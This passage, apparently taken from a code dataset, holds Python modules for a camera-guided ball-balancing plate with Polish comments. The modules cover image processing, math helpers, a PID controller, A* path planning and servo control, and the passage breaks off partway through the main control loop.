    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print(""Starting image processing"")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print(""Stopping image processing"")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow(""Frame debug"", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite(""Frame"" + str(saveCounter) + "".png"", self.frame_original)
                saveCounter += 1
                
            cv2.imshow(""Frame Casted"", self.frame_original)
            key = cv2.waitKey(1) & 0xFF
            #if key == ord(""q""):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype(""int"")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        #cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow(""Corner "" + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            corner = np.round(result * 40.0).astype(""int"")
            
            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            #cv2.circle(self.frame_debug, corners[i], 1, (0, 0, 255), 1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()/n/n/nPythonCode/MathModule.py/n/n#PRZYDATNE FUNKCJE MATEMATYCZNE
import math
import heapq

#zwrca znak liczby
def sign(num):
    if num > 0: return 1.0
    elif num < 0: return -1.0
    return 0.0

#interpolacja liniowa
def lerp(a, b, c):
    return c*b + (1-c) * a

#zwraca dlugosc wektora [x, y] do kwadratu
def sqrMagnitude(x, y=None):
    if y is not None: return x*x + y*y
    return x[0] * x[0] + x[1] * x[1]

#zwraca dlugosc wektora [x, y]
def magnitude(x, y=None):
    if y is not None: return math.sqrt(x*x + y*y)
    return math.sqrt(x[0]*x[0] + x[1]*x[1])

#zwraca odleglosc miedzy punktami A i B
def distance(A, B):
    x = A[0] - B[0]
    y = A[1] - B[1]
    return math.sqrt(x*x + y*y)

#zwraca znormalizowany wektor [x, y]
def normalized(x, y=None):
    if y is not None:
        if x == 0 and y == 0: return (0, 0)
        mag = magnitude(x, y)
        return (x/mag, y/mag)
    else:
        if x[0] == 0 and x[1] == 0: return (0, 0)
        mag = magnitude(x)
        return (x[0]/mag, x[1]/mag)

#zwraca roznice kwadratowa miedzy target a value
def errorsquare(target, value):
    size = len(target)
    sum = 0.0
    for i in range(size):
        a = int(target[i]) - value[i]
        sum += a * a
        
    return sum
        
#zwraca wartosc 'num' ograniczana przez <_min, _max>
def clamp(num, _min, _max):
    if num > _max: return _max
    elif num < _min: return _min
    return num

#kolejka priorytetowa
class PriorityQueue:
    def __init__(self):
        self.elements = []
        
    #dodaje element do kolejki
    def push(self, item, priority):
        heapq.heappush(self.elements, (priority, item))
        
    #zdejmuje i zwraca element z poczatku kolejki
    def pop(self):
        return heapq.heappop(self.elements)[1]
    
    #czy kolejka jest pusta?
    def empty(self):
        return len(self.elements) == 0
        /n/n/nPythonCode/PIDControllerModule.py/n/nimport MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print(""KP = "" + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print(""KI = "" + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print(""KD = "" + str(self.KD))
        
    def decreaseKP(self):
        self.KP -= 50
        print(""KP = "" + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print(""KI = "" + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print(""KD = "" + str(self.KD))
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 0.7        #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.3 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 2.0 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print(""Error = ( "" + str(self.x_error) + ""; "" + str(self.y_error) + "")"")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.8
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.8/n/n/nPythonCode/PathPlannerModule.py/n/nimport cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.1    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print(""PathPlanner object created"")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.path_position = 0.0   #aktualna pozycja na sciezce
        self.path_speed = 0.3 * PathPlanner.obstacle_map_size    #predkosc przechodzenia sciezki
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print(""Starting PathPlanner process"")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print(""Stopping PathPlanner process"")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow(""Map"", frame)
        frame = cv2.inRange(frame, 100, 255)
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 5000
        
        #aktualizacja glownej sciezki
        start = (round(self.ball_pos_x.value * PathPlanner.obstacle_map_size), round(self.ball_pos_y.value * PathPlanner.obstacle_map_size))
        end = (round(self.target_pos_x.value * PathPlanner.obstacle_map_size), round(self.target_pos_y.value * PathPlanner.obstacle_map_size))
        self.path = PathPlanner.a_star(self, start, end)
        
        self.path_last_index = len(self.path)-1
        self.path_position = 0.0
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        
        index = int(self.path_position)
        A = PathPlanner.FromMapToUnitarySpace(path[index])
        
        if self.path_last_index > 0:
            B = PathPlanner.FromMapToUnitarySpace(path[index+1])
            dist = MM.distance(A, B)
            mant = self.path_position - index
            
            self.path_position += self.path_speed * PathPlanner.path_sub_update_delta / (dist * PathPlanner.obstacle_map_size)
            if self.path_position >= self.path_last_index: self.path_position = self.path_last_index - 0.00001
            
            target_y = MM.lerp(A[0], B[0], mant)
            target_x = MM.lerp(A[1], B[1], mant)
        else:
            target_y = A[0]
            target_x = A[1]
            
        print(target_x)
        print(target_y)
        print("""")
        
        self.path_x.value = target_x
        self.path_y.value = target_y
            
        frame = copy.copy(self.obstacle_map)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        
        #DEBUG
        for p in path:
            if PathPlanner.isPointWithinMap(self, p):
                frame[p[0], p[1]] = [255, 255, 0]
            
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow(""PathPlanner frame"", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #zmienia uklad odniesienia z mapy przeszkod na jednostkowy
    def FromMapToUnitarySpace(point):
        return (point[0] / PathPlanner.obstacle_map_size, point[1] / PathPlanner.obstacle_map_size)
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
        movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(x) + "", "" + str(y) + "")"") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(y) + "", "" + str(x) + "")"") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]/n/n/nPythonCode/ServoControllerModule.py/n/nfrom __future__ import division
simulationMode = True

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])
/n/n/n",0
141,d7e7869ba3a5b040215ac4426b4dc10ad8f8e20d,"/PythonCode/Ballance.py/n/nif __name__ == '__main__':
    simulationMode = False    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
